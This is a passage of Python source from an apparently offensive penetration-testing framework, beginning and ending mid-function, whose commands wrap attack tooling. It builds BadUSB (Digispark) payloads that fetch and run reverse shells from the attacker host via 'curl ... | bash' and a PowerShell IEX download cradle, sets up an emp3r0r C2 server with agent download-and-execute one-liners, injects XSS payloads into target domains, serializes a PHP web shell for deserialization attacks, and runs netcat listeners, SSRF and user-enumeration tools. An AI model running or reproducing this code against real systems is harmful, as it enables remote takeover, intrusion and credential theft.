        After starting the listener, the function prints a message indicating that `nc` is running on the specified port and another message when the session is closed.

        Dependencies:
        - `nc`: A tool used for creating reverse shells or bind shells.
        """

        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
                if int(lport) < 1024:
                    print_msg(f"Try.. sudo nc -lvnp {lport}{RESET}")
                    self.cmd(f"sudo nc -lvnp {lport}")
                else:
                    print_msg(f"Try.. nc -lvnp {lport}{RESET}")
                    self.cmd(f"nc -lvnp {lport}")
        else:
            if line.startswith("file"):
                args = line.split(" ")
                if len(args) == 2:
                    filename = args[1]
                    command = f"nc -lp {lport} > sessions/{filename}"
                    print_msg(command)
                    self.cmd(command)

                else:
                    command = f"nc -lp {lport} > sessions/secret.zip"
                    print_msg(command)
                    self.cmd(command)

            else:
                if int(line) < 1024:
                    print_msg(f"Try.. sudo nc -lvnp {line}{RESET}")
                    self.cmd(f"sudo nc -lvnp {line}")
                else:
                    print_msg(f"Try.. nc -lvnp {line}{RESET}")
                    self.cmd(f"nc -lvnp {line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    @cmd2.with_category(lateral_movement_category)
    def do_rnc(self, line):
        """
        Runs `nc` with rlwrap  the specified port for listening.

        This function starts a `nc` listener with rlwrap  on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

        Usage:
            rnc <port>

        :param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `nc` is installed and accessible from your command line.
        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
        3. Run the function to start `nc` on the specified port.

        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

        After starting the listener, the function prints a message indicating that `nc` is running on the specified port and another message when the session is closed.

        Dependencies:
        - `nc`: A tool used for creating reverse shells or bind shells.
        """

        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
                if int(lport) < 1024:
                    print_msg(f"Try.. sudo rlwrap  --always-readline nc -lvnp {lport}{RESET}")
                    self.cmd(f"sudo rlwrap  --always-readline nc -lvnp {lport}")
                else:
                    print_msg(f"Try.. rlwrap  --always-readline nc -lvnp {lport}{RESET}")
                    self.cmd(f"rlwrap  --always-readline nc -lvnp {lport}")
        else:
            if line.startswith("file"):
                args = line.split(" ")
                if len(args) == 2:
                    filename = args[1]
                    command = f"rlwrap  --always-readline nc -lp {lport} > sessions/{filename}"
                    print_msg(command)
                    self.cmd(command)

                else:
                    command = f"rlwrap  --always-readline nc -lp {lport} > sessions/secret.zip"
                    print_msg(command)
                    self.cmd(command)

            else:
                if int(line) < 1024:
                    print_msg(f"Try.. sudo rlwrap  --always-readline nc -lvnp {line}{RESET}")
                    self.cmd(f"sudo rlwrap  --always-readline nc -lvnp {line}")
                else:
                    print_msg(f"Try.. rlwrap  --always-readline nc -lvnp {line}{RESET}")
                    self.cmd(f"rlwrap  --always-readline nc -lvnp {line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown rlwrap nc sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    @cmd2.with_category(reporting_category)
    def do_createjsonmachine(self, line):
        """
        Create a new JSON payload file based on the template provided in payload.json.

        This function reads an existing JSON file named 'payload.json' and
        allows the user to update specific fields. The following fields can
        be modified:

        - 'url': The new URL to connect to, which can be entered manually
        or automatically generated based on the input parameter 'line'.
        - 'domain': The new domain associated with the URL, similarly
        generated or entered.
        - 'rhost': The new remote host IP address that needs to be specified
        by the user.

        All other fields from the original payload are preserved in the new
        JSON file, ensuring that no other data is lost or altered.

        The newly created JSON payload will be saved in a new file with the
        format 'payload_<new_name>.json', where <new_name> is derived
        from the domain name's subpart.

        Parameters:
        line (str): An optional string parameter that, if provided, is used
                    to generate the new 'url' and 'domain'. If empty,
                    the user will be prompted to enter values for 'url'
                    and 'domain'.

        Returns:
        None
        """
        old_domain = get_domain(self.params["url"])
        try:
            with open('payload.json', 'r') as file:
                data = json.load(file)
        except FileNotFoundError:
            print_error("Error: payload.json not found")
            return

        if not line:
            new_url = input("    [!] Enter new value to 'url': ")
            new_domain = input("    [!] Enter new value to 'domain': ")
        else:
            new_url = f"http://{line}.htb"
            new_domain = f"{line}.local"

        new_ip = input("    [!] Enter new value to 'rhost': ")
        if not new_ip:
            print_error("You need to provide a new rhost")
            return
        if not new_url:
            print_error("you need pass new_url")
            return
        if not new_domain:
            print_error("you need pass new_domain")
            return
        data['url'] = new_url
        data['domain'] = new_domain
        data['rhost'] = new_ip

        new_name = new_domain.split(".")[0]
        self.cmd(f"mv payload.json payload_{old_domain}.json")
        new_filename = f"payload_{new_name}.json"

        with open(new_filename, 'w') as outfile:
            json.dump(data, outfile, indent=4)
        self.cmd(f"cp {new_filename} payload.json")
        print_msg(f"Updated file saved as {new_filename}")
        self.onecmd("p")
        return

    @cmd2.with_category(exploitation_category)
    def do_xss(self, line):
        """
        Executes the XSS (Cross-Site Scripting) vulnerability testing procedure
        using user-defined parameters and configurations.

        This method guides the user through the process of setting up and
        executing XSS payload injections against a specified target domain.
        It prompts the user for necessary input, including the XSS payload
        URL, the target domain, and the request timeout settings. The
        function ensures that all required inputs are provided and valid
        before proceeding with the injection process.

        Parameters:
            line (str): A line of input that may contain additional parameters
                        or commands (not utilized within this method).

        Raises:
            ValueError: If the provided payload URL or target domain is empty,
                        indicating that these are required for the injection
                        process.

        This method leverages user input for flexibility, allowing
        customized testing scenarios for XSS vulnerabilities.
        """
        print_msg("Welcome to the Lazy XSS Hunter")
        lhost = self.params["lhost"]
        url = f"http://{lhost}:4444/xss"
        domain = self.params["domain"]
        payload_url = prompt(f"[?] Enter your XSS Payload URL to get the L00T (default: {url})") or url
        if not payload_url:
            raise ValueError("Payload URL cannot be empty")

        target_domain = prompt(f"[?] Enter the target domain (default: {domain})") or domain
        if not target_domain:
            raise ValueError("Target domain cannot be empty")
        request_timeout = int(prompt("[?] Set request timeout in seconds (default=15)") or 15)

        inject_payloads([target_domain], payload_url, request_timeout)

        print_msg("[+] All tasks completed. Check your XSS Report endpoint for triggered payloads.")

    @cmd2.with_category(scanning_category)
    def do_arjun(self, line):
        """
        Executes an Arjun scan on the specified URL for parameter discovery.

        This function checks if Arjun is installed on the system, installs it if necessary, and then constructs
        a command to run Arjun against the provided URL with user-defined options.

        Parameters:
            line (str): Input line, not currently used.
        """

        if not is_binary_present("arjun"):
            print_warn("Arjun is not present in the system, installing...")
            self.cmd("pip3 install arjun")

        rhost = self.params["rhost"]
        url = self.params["url"]
        domain = get_domain(url)
        path = os.getcwd()
        file = f"{path}/sessions/{rhost}_arjun_{domain}.txt"

        command = f"arjun -u {url} -oT {file} -t 20"
        if line and line.startswith("fast"):
            print_msg("Fast Arjun")
        else:
            method = prompt("[?] Specify HTTP method (GET/POST/JSON/XML, default: GET): ", "GET")
            command += f" -m {method}"

            input_file = prompt("[?] Import targets from a file (leave empty to skip): ", "")
            if input_file:
                command += f" -i {input_file}"

            wordlist = prompt("[?] Use custom wordlist (leave empty to skip): ", "")
            if wordlist:
                command += f" -w {wordlist}"

            chunk_size = prompt("[?] Control query size (default: 500, leave empty to skip): ", "500")
            if chunk_size:
                command += f" -c {chunk_size}"

            delay = prompt("[?] Delay between requests in seconds (leave empty to skip): ", "")
            if delay:
                command += f" -d {delay}"

            include_data = prompt("[?] Include persistent data (e.g., 'api_key=xxxxx', leave empty to skip): ", "")
            if include_data:
                command += f" --include='{include_data}'"

            headers = prompt("[?] Use custom HTTP headers (e.g., \"User-Agent: <?php system($_GET['c']); ?>\", leave empty to skip): ", "")
            if headers:
                command += f" --headers '{headers}'"

            timeout = prompt("[?] Set request timeout in seconds (default: 15, leave empty to skip): ", "15")
            if timeout:
                command += f" -T {timeout}"

            stable_mode = prompt("[?] Enable stable mode (y/n, default: n): ", "n")
            if stable_mode.lower() == 'y':
                command += " --stable"

        print_msg(f"Executing command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_transform(self, line):
        """
        Transforms the input string based on user-defined casing style.

        This command asks the user for a casing style (e.g., lower, upper, camel, pascal)
        and transforms the input string accordingly.

        Parameters:
            line (str): Input string to be transformed.
        """
        if not line:
            print_error("You need to pass the string as an argument, e.g., transform foo")
            return

        casing_input = input("    [?] Enter casing style (lower/l, upper/u, camel/c, pascal/p): ").strip().lower()
        if casing_input not in ['l', 'u', 'c', 'p']:
            print_warn("Invalid casing style. Choose from: l, u, c, p.")
            return

        delimiter = detect_delimiter(line)
        parts = handle(line)
        transformed_str = transform(parts, delimiter, casing_input)

        copy2clip(transformed_str)
        print_msg(f"Transformed string: {transformed_str}")
        return

    @cmd2.with_category(scanning_category)
    def do_finger_user_enum(self, line):
        """
        Executes the `finger-user-enum` tool for enumerating users on the target host.

        This function checks if the `finger-user-enum` script is available locally; if not, it clones
        it from GitHub. It then constructs a command to run the tool with the provided wordlist of
        usernames and target host, and executes the command in the system.

        Parameters:
            line (str): Input line, not currently used.

        Returns:
            None: Outputs the command executed and any messages during execution.
        """
        path = os.getcwd()
        finger = f"{path}/modules_ext/finger-user-enum/finger-user-enum.pl"
        rhost = self.params["rhost"]
        usrwordlist = self.params["usrwordlist"]
        if not os.path.exists(finger):
            github = "git clone https://github.com/pentestmonkey/finger-user-enum.git modules_ext/finger-user-enum"
            print_warn("finger-user-enum not found cloning...")
            print_msg(github)
            self.cmd(github)

        use_small_dict = input("    [?] Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)


            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')
            small_users = get_users_dic()
            command = f"{finger} -U {small_users} -t {rhost}"
        else:

            command = f"{finger} -U {usrwordlist} -t {rhost}"
        print_msg(command)
        self.cmd(command)

        return

    @cmd2.with_category(command_and_control_category)
    def do_duckyspark(self, line):
        """
        duckyspark Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.

        duckyspark method checks if Arduino CLI and Micronucleus are installed on the system.
        If they are not available, it installs them. It then compiles a Digispark sketch
        and uploads the generated .hex file to the Digispark device.

        The method duckyspark performs the following actions:
        1. Checks for the presence of Arduino CLI and installs it if not available.
        2. Configures Arduino CLI for Digispark if not already configured.
        3. Generates a reverse shell payload and prepares the sketch for Digispark.
        4. Compiles the prepared Digispark sketch using Arduino CLI.
        5. Checks for the presence of Micronucleus and installs it if not available.
        6. Uploads the compiled .hex file to the Digispark device using Micronucleus.

        Args:
            line (str): Command line input provided by the user, which may contain additional parameters.

        Returns:
            None: The function does not return any value but may modify the state of the system
                by executing commands.
        """

        if not is_binary_present("arduino-cli"):
            print_warn("Arduino CLI not found, installing...")
            install_cli = "curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh"
            self.cmd(install_cli)

            print_msg("Configuring Arduino CLI for Digispark...")
            self.cmd("arduino-cli core update-index")
            self.cmd("arduino-cli core install digistump:avr")

        if not is_binary_present("micronucleus"):
            print_warn("Micronucleus not found, installing...")
            self.cmd("sudo apt-get install -y micronucleus")
        payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or '1'

        if payload_type == '2':
            self.onecmd("createrevshell")
            lhost = self.params["lhost"]
            if not check_lhost(lhost):
                return
            rev = f"curl http://{lhost}/revshell.sh | bash"
            print_msg(rev)

            encoded_bytes = base64.b64encode(rev.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            payload = f"echo '{encoded_str}' | base64 -d | bash"

            print_msg(encoded_str)
            print_msg(payload)

            path = os.getcwd()
            file = f"{path}/modules/digispark.ino"

            if not is_exist(file):
                return

            with open(file, 'r') as f:
                content = f.read()

            content = content.replace("{payload}", payload)
            self.cmd(f"mkdir {path}/sessions/revshell")
            file_ino = f"{path}/sessions/revshell/revshell.ino"
            with open(file_ino, 'w+') as f:
                f.write(content)

            if not is_exist(file_ino):
                print_error("Error: revshell.ino file was not created.")
                return
            else:
                with open(file_ino, 'r') as f:
                    content = f.read()
                    if not content.strip():
                        print_error("Error: revshell.ino file is empty.")
                        return

            print_msg(f"Compiling the sketch {file_ino}...")
            output_dir = f"{path}/sessions/revshell"
            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
            print_msg(compile_command)
            self.cmd(compile_command)

            hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex"
            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
            upload_command = f"micronucleus --run {hex_file_path}"
            print_msg(upload_command)
            self.cmd(upload_command)

        elif payload_type == '1':
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            path = os.getcwd()
            if not check_lhost(lhost):
                return
            download = "cd sessions && wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
            print_msg(download)
            self.cmd(download)
            editor = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> Invoke-PowerShellTcp.ps1"
            print_msg(editor)
            self.cmd(editor)
            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1')".replace("{lhost}",lhost)
            print_msg(payload)
            utf16_command = payload.encode('utf-16le')
            base64_command = base64.b64encode(utf16_command).decode('utf-8')
            payload = base64_command
            ino_file = "digispark_win.ino"
            print_msg(f"Generated Windows payload: powershell /enc  {payload}")
            path = os.getcwd()
            file = f"{path}/modules/{ino_file}"
            if not is_exist(file):
                return

            with open(file, 'r') as f:
                content = f.read()

            content = content.replace("{payload}", payload)
            self.cmd(f"mkdir {path}/sessions/winrevshell")
            file_ino = f"{path}/sessions/winrevshell/winrevshell.ino"
            with open(file_ino, 'w+') as f:
                f.write(content)

            if not is_exist(file_ino):
                print_error("Error: winrevshell.ino file was not created.")
                return
            else:
                with open(file_ino, 'r') as f:
                    content = f.read()
                    if not content.strip():
                        print_error("Error: winrevshell.ino file is empty.")
                        return

            print_msg(f"Compiling the sketch {file_ino}...")
            output_dir = f"{path}/sessions/winrevshell"
            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
            print_msg(compile_command)
            self.cmd(compile_command)

            hex_file_path = f"{path}/sessions/winrevshell/winrevshell.ino.hex"
            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
            upload_command = f"micronucleus --run {hex_file_path}"
            print_msg(upload_command)
            self.cmd(upload_command)

        elif payload_type == '3':

            lhost = self.params["lhost"]
            lport = self.params["lport"]
            path = os.getcwd()
            if not check_lhost(lhost):
                return
            ino_file = "digispark_android.ino"


            path = os.getcwd()
            file = f"{path}/modules/{ino_file}"
            if not is_exist(file):
                return

            with open(file, 'r') as f:
                content = f.read()

            payload = input(f"Enter url to force visit. to get one use:{GREEN} stormbreaker: " )
            content = content.replace("{payload}", payload)
            self.cmd(f"mkdir {path}/sessions/androidbrowser")
            file_ino = f"{path}/sessions/androidbrowser/androidbrowser.ino"
            with open(file_ino, 'w+') as f:
                f.write(content)

            if not is_exist(file_ino):
                print_error("Error: androidbrowser.ino file was not created.")
                return
            else:
                with open(file_ino, 'r') as f:
                    content = f.read()
                    if not content.strip():
                        print_error("Error: androidbrowser.ino file is empty.")
                        return

            print_msg(f"Compiling the sketch {file_ino}...")
            output_dir = f"{path}/sessions/androidbrowser"
            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
            print_msg(compile_command)
            self.cmd(compile_command)

            hex_file_path = f"{path}/sessions/androidbrowser/androidbrowser.ino.hex"
            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
            upload_command = f"micronucleus --run {hex_file_path}"
            print_msg(upload_command)
            self.cmd(upload_command)

        else:
            print_error("Invalid payload target.")
            return
        print_msg("Upload completed.")
        if not payload_type == '3':
            self.onecmd("nc")
        return

    @cmd2.with_category(credential_access_category)
    def do_username_anarchy(self, line):
        """
        Generate usernames using the username-anarchy tool based on user input.

        This function prompts the user to either provide names directly or select
        options such as auto-generation based on country datasets, input files, and
        specific username formats. It then constructs the command for `username-anarchy`
        and executes it.

        :param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname
        :returns: None
        """
        path = os.getcwd()
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        log = f"{path}/sessions/username_anarchy_{rhost}.txt"
        command_base = f"{path}/external/.exploit/username_anarchy/username-anarchy"

        if not is_exist(command_base):
            print_warn("Username-anarchy not found. cloning...")
            self.cmd("git clone https://github.com/urbanadventurer/username-anarchy.git .exploit/username_anarchy")

        if line:
            name = line.replace(" ","")
            log = f"{path}/sessions/username_anarchy_{rhost}_{name}.txt"
            cmd = f"{command_base} {line} > {log}"
            self.cmd(cmd)
            return

        auto_generate = input("    [!] Do you want to auto-generate usernames? (y/n): ").strip().lower() or 'n'

        if auto_generate == 'y':
            country = input("    [!] Enter the country for auto-generation [argentina, austria, belgium, canada, china, denmark, france, germany, hungary, india, ireland, italy, luxembourg, netherlands, newzealand, norway, poland, serbia, slovenia, spain, sweden, switzerland, uk, us, Facebook] (or leave blank for default): ").strip()
            if country:
                command = f"{command_base} --auto --country {country}"
            else:
                command = f"{command_base} --auto"
        else:
            input_file = input("    [!] Do you have an input file? (y/n): ").strip().lower() or 'y'
            if input_file == 'y':
                file_path = get_users_dic()
                command = f"{command_base} --input-file {file_path}"
            else:
                name_format = input("    [!] Enter names (e.g., first last): ").strip()
                command = f"{command_base} {name_format}"

            select_format = input("    [!] Do you want to specify a format plugin? (y/n): ").strip().lower() or 'y'
            if select_format == 'y':

                format_plugins = [
                    "first",
                    "firstlast",
                    "first.last",
                    "firstlast[8]",
                    "firstl",
                    "f.last",
                    "flast",
                    "lfirst",
                    "l.first",
                    "lastf",
                    "last",
                    "last.f",
                    "last.first",
                    "FLast",
                    "first1",
                    "fl",
                    "fmlast",
                    "firstmiddlelast",
                    "fml",
                    "FL",
                    "FirstLast",
                    "First.Last",
                    "Last"
                ]
                print_msg("Available username format plugins:")
                for i, plugin in enumerate(format_plugins):
                    print_msg(f"        {i+1}. {plugin}")

                plugin_choice = input(f"    [!] Choose one or more format plugins (e.g., 1,3,5): ").strip() or '1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'
                try:

                    chosen_indices = [int(x) for x in plugin_choice.split(',') if x.isdigit() and 1 <= int(x) <= len(format_plugins)]
                    if chosen_indices:
                        selected_plugins = ",".join([format_plugins[i - 1] for i in chosen_indices])
                        command += f" --select-format {selected_plugins}"
                    else:
                        print_error("Invalid format selection.")
                        return
                except ValueError:
                    print_error("Invalid input format. Please provide valid numbers separated by commas.")
                    return

        command += f" > {log}"
        choice = input("    [!] Do you wanna add the Domain to dict. (y/n) ") or 'n'
        if choice == 'y':
            command += f" | | xargs -n 1 echo {domain}\\ | tr -d ' ' > sessions/unames_{domain}.txt"
        print_msg(f"    [!] Generated command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(command_and_control_category)
    def do_emp3r0r(self, line):
        """
        Command emp3r0r Downloads and sets up the Emperor server for local exploitation.

        This function performs the following tasks:
        1. Checks if Emperor is already downloaded.
        2. Downloads the Emperor tar.xz file if not already present.
        3. Extracts the contents into the sessions directory.
        4. Executes the Emperor server.
        5. Prepares the agent download command based on the OS Host and copies it to the clipboard.

        Args:
            line (str): Optional arguments to specify port Relay

        Returns:
            None

        Example:
            emp3r0r 6666

        Notes:
            - Ensure that the required dependencies are installed.
        """
        path = os.getcwd()
        sessions_dir = os.path.join(path, "sessions")
        emperor_url = "https://github.com/jm33-m0/emp3r0r/releases/download/v1.37.4/emp3r0r-v1.37.4.tar.xz"
        emperor_tar = os.path.join(sessions_dir, "emp3r0r.tar.xz")
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        os.makedirs(sessions_dir, exist_ok=True)
        emperor_dir = os.path.join(sessions_dir, "emp3r0r-build")
        command_server = f"{emperor_dir}/emp3r0r -relay_server {lport}"

        if not os.path.exists(emperor_tar):
            print_msg("Downloading Emperor...")
            self.cmd(f"curl -L -o {emperor_tar} {emperor_url}")
            print_msg("Extracting Emperor...")
            self.cmd(f"tar -xf {emperor_tar} -C {sessions_dir}")
            install = f"sudo .{emperor_dir}/emp3r0r --install"
            self.cmd(install)
        else:
            print_msg("    [!] Emperor already downloaded, skipping download.")

        choice = input("    [?] If the target is Windows choice 1 or 2 to Linux") or '2'
        if not line:
            relay = input("    [!] Enter port Relay (default: 6666): ") or '6666'
        else:
            relay = line

        if choice == '1':
            download_command = f"powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://{lhost}/emp3r0r-build/emp3r0r.exe', 'agent.exe'); Start-Process -FilePath 'agent.exe' -ArgumentList '/S'\""
        elif choice == '2':
            download_command = f"wget http://{lhost}/emp3r0r-build/emp3r0r -O emp3r0r && chmod +x emp3r0r && ./emp3r0r --install && ./emp3r0r -connect_relay {lhost}:{lport} -relayed_port {relay}"
        else:
            print_warn("Wrong Choice")
            return

        copy2clip(download_command)
        print_msg(command_server)
        self.cmd(command_server)
        print_msg("Emperor server started and agent download command copied to clipboard.")
        return

    @cmd2.with_category(exploitation_category)
    def do_template_helper_serializer(self, line):
        """
        Handles the creation and serialization of a template helper.

        This function performs the following tasks:
        1. Retrieves the filename and data to be written from the input line.
        2. Initializes a template file and writes the data to it.
        3. Serializes the template data and outputs the result.

        Args:
            line (str): The input line containing the filename and data in the format "filename, data".

        Returns:
            None

        Raises:
            None

        Example:
            template_helper_serializer shell.php, <?php system($_GET[0]); ?>
        """
        if not line:
            line = 'shell.php, <?php system($_GET[0]); ?>'

        file, data = line.split(',', 1)
        file = file.strip()
        data = data.strip()

        log_dir = os.path.join(os.path.dirname(__file__), 'sessions/logs')
        os.makedirs(log_dir, exist_ok=True)

        with open(os.path.join(log_dir, file), 'w') as f:
            f.write(data)

        template_data = {
            'file': file,
            'data': data
        }
        print_msg(template_data)
        serialized_data = f'O:14:"TemplateHelper":2:{{s:4:"file";s:{len(file)}:"{file}";s:4:"data";s:{len(data)}:"{data}";}}'
        print_msg(serialized_data)
        copy2clip(serialized_data)
        return

    @cmd2.with_category(lateral_movement_category)
    def do_gospherus(self, line):
        """
        Command gospherus: Clones and uses the Gopherus tool to generate gopher payloads for various services.
        Use the command template_helper_serializer to generate the serialization payload. more info help template_helper_serializer

        This function performs the following tasks:
        0. Install Python2 (Old protocol, old t00l, old python)
        1. Checks if Gopherus is already cloned in the external/.exploit directory.
        2. Clones the Gopherus repository if not already present.
        3. Enumerates the possible exploits and prompts the user to choose one.
        4. Runs the selected exploit using Gopherus.

        Args:
            line (str): Optional argument for specifying the chosen exploit.

        Returns:
            None

        Example:
            gospherus 2
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        gopherus_url = "https://github.com/tarunkant/Gopherus.git"
        gopherus_dir = os.path.join(exploit_dir, "Gopherus")

        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(gopherus_dir):
            print_msg("Cloning Gopherus repository...")
            self.cmd(f"git clone {gopherus_url} {gopherus_dir}")
        else:
            print_msg("Gopherus already cloned, skipping cloning.")

        exploits = [
            "MySQL",
            "PostgreSQL",
            "FastCGI",
            "Redis",
            "Zabbix",
            "PyMemcache",
            "RbMemcache",
            "PhpMemcache",
            "DmpMemcache",
            "SMTP"
        ]

        for i, exploit in enumerate(exploits, 1):
            print_msg(f"{i}. {exploit}")

        if not line:
            choice = input("Select the exploit number: ") or '8'
        else:
            choice = line.strip()

        try:
            choice = int(choice)
            if 1 <= choice <= len(exploits):
                selected_exploit = exploits[choice - 1].lower()
                print_msg(f"Running Gopherus exploit: {selected_exploit}")
                print_msg(f"Try... cd {gopherus_dir} && python2 gopherus.py --exploit {selected_exploit}")
                self.cmd(f"cd {gopherus_dir} && python2 gopherus.py --exploit {selected_exploit}")
            else:
                print_warn("Invalid choice.")
        except ValueError:
            print_warn("Invalid input, expected a number.")

        return

    @cmd2.with_category(scanning_category)
    def do_wpscan(self, line):
        """
        Command wpscan: Installs and runs WPScan to perform WordPress vulnerability scanning.

        This function performs the following tasks:
        1. Checks if WPScan is installed.
        2. Installs WPScan using gem if not already installed.
        3. Prompts the user for a URL to scan.
        4. Allows the user to choose additional WPScan options such as --stealthy or --enumerate.
        5. Executes the WPScan command with the chosen options.

        Args:
            line (str): Optional argument to specify the URL or additional WPScan options.

        Returns:
            None

        Example:
            wpscan --url blog.tld
        """
        url_target = self.params["url"]

        if not is_binary_present("wpscan"):
            print_msg("WPScan not found, installing it using gem...")
            self.cmd("sudo gem install wpscan")
        else:
            print_msg("WPScan is already installed.")

        if not line:
            url = input(f"    [!] Enter the WordPress site URL to scan (default {url_target}): ").strip() or url_target
        else:
            url = line.strip()

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        stealthy = input("    [?] Do you want to enable stealthy mode? (y/n): ").strip().lower() or 'n'
        stealthy_flag = "--stealthy" if stealthy == 'y' else ""

        enumerate_option = input("    [?] Do you want to enumerate usernames or plugins? (e.g., u, u1-100, p,  default is none): ").strip() or ""
        enumerate_flag = f"--enumerate {enumerate_option}" if enumerate_option else ""

        api_token_flag = ""
        if os.getenv("WPSCAN_API_TOKEN"):
            api_token_flag = f"--api-token {os.getenv('WPSCAN_API_TOKEN')}"
        else:
            print_warn("WPScan API token not found in environment (export WPSCAN_API_TOKEN=\"your_api_token\"). You can still run the scan without vulnerability data.")

        command = f"wpscan --url {url} {stealthy_flag} {enumerate_flag} {api_token_flag}"
        print_msg(f"Running WPScan: {command}")

        self.cmd(command)
        return

    @cmd2.with_category(reporting_category)
    def do_createjsonmachine_batch(self, line):
        """
        Create multiple JSON payload files based on a CSV input file from HackerOne.

        This function processes a CSV file located in the 'sessions' directory. The CSV file
        must contain information about different assets, including 'identifier',
        'eligible_for_bounty', and 'eligible_for_submission'. For each asset where
        both 'eligible_for_bounty' and 'eligible_for_submission' are set to True,
        a JSON payload file is created using a predefined template.

        The CSV must contain the following columns:
        - 'identifier': Domain or asset name used to generate the URL and domain for the payload.
        - 'eligible_for_bounty': A boolean indicating if the asset is eligible for bounty.
        - 'eligible_for_submission': A boolean indicating if the asset is eligible for submission.

        For each eligible asset:
        - The URL is generated based on the 'identifier' field.
        - The domain is derived from the 'identifier' field.
        - The 'rhost' field in the JSON payload is updated using the IP address obtained by pinging the domain.

        The JSON payload is saved in the format 'payload_<identifier>.json'.

        Parameters:
        line (str): An optional string parameter. If provided, it selects the corresponding CSV file
                    in the 'sessions' directory based on the user's input.

        Returns:
        None
        """
        sessions_dir = 'sessions'
        csv_files = [f for f in os.listdir(sessions_dir) if f.endswith('.csv')]

        if not csv_files:
            print_error("No CSV files found in the 'sessions' directory.")
            return

        print_msg("Available CSV files:")
        for idx, file in enumerate(csv_files):
            print_msg(f"{idx}: {file}")

        try:
            csv_index = int(input(f"    {GREEN}[!]{CYAN} Select the CSV file number to use: {RESET}"))
            csv_file = csv_files[csv_index]
        except (IndexError, ValueError):
            print_error("Invalid selection.")
            return

        csv_path = os.path.join(sessions_dir, csv_file)

        try:
            with open(csv_path, mode='r') as file:
                reader = csv.DictReader(file)
                for row in reader:
                    identifier = row['identifier'].replace("*.","")
                    eligible_for_bounty = row['eligible_for_bounty'].lower() == 'true'
                    eligible_for_submission = row['eligible_for_submission'].lower() == 'true'

                    if eligible_for_bounty and eligible_for_submission:
                        try:
                            ping_result = subprocess.run(['ping', '-c', '1', identifier], capture_output=True, text=True)
                            if ping_result.returncode != 0:
                                print_error(f"Failed to ping {identifier}. Skipping.")
                                continue
                            ip_address = ping_result.stdout.split()[2].strip('()')

                            with open('payload.json', 'r') as payload_file:
                                data = json.load(payload_file)

                            new_url = f"http://{identifier}"
                            new_domain = identifier
                            data['url'] = new_url
                            data['domain'] = new_domain
                            data['rhost'] = ip_address

                            new_filename = f"payload_{identifier.replace('.', '_')}.json"
                            with open(new_filename, 'w') as outfile:
                                json.dump(data, outfile, indent=4)

                            print_msg(f"Created payload for {identifier}: {new_filename}")

                        except Exception as e:
                            print_error(f"Error processing {identifier}: {str(e)}")
        except FileNotFoundError:
            print_error(f"CSV file not found: {csv_path}")
            return

    @cmd2.with_category(miscellaneous_category)
    def do_ip2hex(self, line):
        """
        Convert an IPv4 address into its hexadecimal representation.

        This function takes an IPv4 address in standard dotted-decimal format
        (e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal
        number. The resulting hexadecimal string is concatenated without separators,
        providing the full hexadecimal equivalent of the IP address.

        The input IP address is expected to be a string in the format 'X.X.X.X',
        where X is an integer between 0 and 255.

        Parameters:
        line (str): The input string representing the IPv4 address in dotted-decimal format.

        Returns:
        None: The hexadecimal equivalent of the IP address is printed to the console.
        """
        try:
            octets = line.strip().split('.')
            hex_value = ''.join([format(int(octet), '02x') for octet in octets])
            print_msg(f"Hexadecimal representation: {hex_value}")
        except ValueError:
            print_error("Invalid IP address format. Please provide a valid IPv4 address.")

    @cmd2.with_category(credential_access_category)
    def do_john2keepas(self, line):
        """
        List all .kdbx files in the 'sessions' directory, let the user select one, and run the
        command `sudo keepass2john {user_file} > sessions/hash.txt`.
        If 'sessions/hash.txt' already exists, it will be backed up with a timestamp to avoid overwriting.

        Parameters:
        line (str): An optional string parameter. This can be used for any additional input,
                    though it's not needed in this specific command.

        Returns:
        None
        """
        sessions_dir = 'sessions'
